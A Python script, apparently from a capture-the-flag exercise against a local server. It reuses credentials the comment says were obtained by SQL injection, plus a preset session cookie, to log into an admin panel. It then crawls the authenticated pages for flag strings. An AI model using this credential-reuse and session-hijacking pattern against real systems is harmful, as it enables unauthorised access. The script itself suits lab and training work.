import requests
import re
from urllib.parse import urljoin

# Target configuration
base_url = "http://127.0.0.1:32854"
admin_url = urljoin(base_url, "/admin.php")

# Session with existing cookie
session = requests.Session()
session.cookies.set("PHPSESSID", "6ed26fd19fb4899001e92a52083b5a2a", domain="127.0.0.1", path="/")

# Headers for form submission
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Credentials from SQL injection
credentials = {
    "username": "ONE",
    "password": "verySecurePassword123!"
}

print("[*] Attempting authentication to admin panel")
print(f"[*] Target: {admin_url}")
print(f"[*] Username: {credentials['username']}")
print(f"[*] Password: {credentials['password']}")
print()

# Step 1: POST authentication request
print("[+] Sending POST request with credentials...")
try:
    auth_response = session.post(
        admin_url,
        data=credentials,
        headers=headers,
        allow_redirects=False
    )
    
    print(f"[+] Status Code: {auth_response.status_code}")
    print(f"[+] Response Length: {len(auth_response.content)}B")
    print()
    
    # Check for Set-Cookie headers
    if 'Set-Cookie' in auth_response.headers:
        print(f"[+] Set-Cookie Header: {auth_response.headers['Set-Cookie']}")
        print()
    
    # Display all response headers
    print("[+] Response Headers:")
    for header, value in auth_response.headers.items():
        print(f"    {header}: {value}")
    print()
    
    # Display cookies
    print("[+] Session Cookies:")
    for cookie in session.cookies:
        print(f"    {cookie.name}={cookie.value}")
    print()
    
    # Check response body
    print("[+] Response Body:")
    print(auth_response.text)
    print()
    
    # Search for flags
    flags = re.findall(r'FLAG\{[^}]+\}', auth_response.text, re.IGNORECASE)
    if flags:
        print(f"[!] FLAGS FOUND IN AUTH RESPONSE:")
        for flag in flags:
            print(f"    {flag}")
        print()
    
    # Check for success indicators
    success_indicators = ['welcome', 'dashboard', 'admin panel', 'logged in', 'successful']
    response_lower = auth_response.text.lower()
    
    authenticated = False
    for indicator in success_indicators:
        if indicator in response_lower:
            print(f"[!] Success indicator found: '{indicator}'")
            authenticated = True
    
    # Check if redirected
    if auth_response.status_code in [301, 302, 303, 307, 308]:
        print(f"[!] Redirect detected to: {auth_response.headers.get('Location', 'Unknown')}")
        authenticated = True
    
    print()
    
    # Step 2: Follow up with GET request to admin.php (if auth succeeded)
    if authenticated or auth_response.status_code == 200:
        print("[+] Following up with GET request to admin panel...")
        get_response = session.get(admin_url)
        
        print(f"[+] GET Status Code: {get_response.status_code}")
        print(f"[+] GET Response Length: {len(get_response.content)}B")
        print()
        
        print("[+] GET Response Body:")
        print(get_response.text)
        print()
        
        # Search for flags in GET response
        flags_get = re.findall(r'FLAG\{[^}]+\}', get_response.text, re.IGNORECASE)
        if flags_get:
            print(f"[!] FLAGS FOUND IN GET RESPONSE:")
            for flag in flags_get:
                print(f"    {flag}")
            print()
    
    # Step 3: Try accessing root with authenticated session
    print("[+] Attempting to access root endpoint with authenticated session...")
    root_response = session.get(base_url)
    
    print(f"[+] Root Status Code: {root_response.status_code}")
    print(f"[+] Root Response Length: {len(root_response.content)}B")
    print()
    
    print("[+] Root Response Body:")
    print(root_response.text)
    print()
    
    # Search for flags in root response
    flags_root = re.findall(r'FLAG\{[^}]+\}', root_response.text, re.IGNORECASE)
    if flags_root:
        print(f"[!] FLAGS FOUND IN ROOT RESPONSE:")
        for flag in flags_root:
            print(f"    {flag}")
        print()
    
    # Step 4: Extract and test any links found in responses
    print("[+] Extracting links from authenticated responses...")
    all_content = auth_response.text + get_response.text if authenticated else auth_response.text
    
    # Find href links
    links = re.findall(r'href=["\']([^"\']+)["\']', all_content, re.IGNORECASE)
    links = list(set(links))  # Remove duplicates
    
    if links:
        print(f"[+] Found {len(links)} unique links:")
        for link in links:
            print(f"    {link}")
        print()
        
        # Test each link
        for link in links:
            if link.startswith('http'):
                test_url = link
            elif link.startswith('/'):
                test_url = urljoin(base_url, link)
            else:
                test_url = urljoin(base_url + '/', link)
            
            # Skip external links
            if not test_url.startswith(base_url):
                continue
            
            print(f"[+] Testing link: {test_url}")
            try:
                link_response = session.get(test_url, timeout=5)
                print(f"    Status: {link_response.status_code} | Length: {len(link_response.content)}B")
                
                # Check for flags
                link_flags = re.findall(r'FLAG\{[^}]+\}', link_response.text, re.IGNORECASE)
                if link_flags:
                    print(f"    [!] FLAGS FOUND:")
                    for flag in link_flags:
                        print(f"        {flag}")
                    print(f"    Response Body:")
                    print(link_response.text)
                print()
            except Exception as e:
                print(f"    Error: {e}")
                print()
    
    # Summary
    print("[*] AUTHENTICATION TEST SUMMARY")
    print(f"[*] Authentication Status: {'SUCCESS' if authenticated else 'UNKNOWN'}")
    all_flags = flags + (flags_get if authenticated else []) + (flags_root if 'flags_root' in locals() else [])
    if all_flags:
        print(f"[!] Total Flags Found: {len(all_flags)}")
        for flag in set(all_flags):
            print(f"    {flag}")
    else:
        print("[*] No flags found in responses")

except Exception as e:
    print(f"[-] Error during authentication test: {e}")
    import traceback
    traceback.print_exc()

